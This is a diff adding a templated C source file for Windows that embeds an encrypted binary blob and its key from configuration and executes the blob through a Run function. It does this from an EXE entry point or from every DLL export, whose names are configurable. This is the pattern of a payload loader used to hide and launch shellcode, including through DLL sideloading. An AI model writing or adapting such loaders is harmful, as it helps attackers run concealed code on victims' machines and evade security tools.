@@ -1,0 +1,42 @@
+#include <windows.h>
+#include "core.h"
+
+unsigned char bin[{{config['bin_size']}}] = { {{config['bin']}} };
+int binSize = {{config['bin_size']}};
+unsigned char key[{{config['key_size']}}] = { {{config['key']}} };
+int keySize = {{config['key_size']}};
+
+{%- if 'exe' in config %}
+
+void emain()
+{
+	Run(bin, binSize, key, keySize);
+}
+
+{% elif 'dll' in config %}
+
+{% for name in config['dll']['exports'] %}
+__declspec(dllexport) void* {{ name }}(void* _, ...) 
+{
+    Run(bin, binSize, key, keySize);
+}
+
+{% endfor %}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
+{
+    BOOL bReturnValue = TRUE;
+    switch (dwReason) {
+    case DLL_PROCESS_ATTACH: 
+    {
+        break;
+    }
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return bReturnValue;
+}
+
+{% endif %}
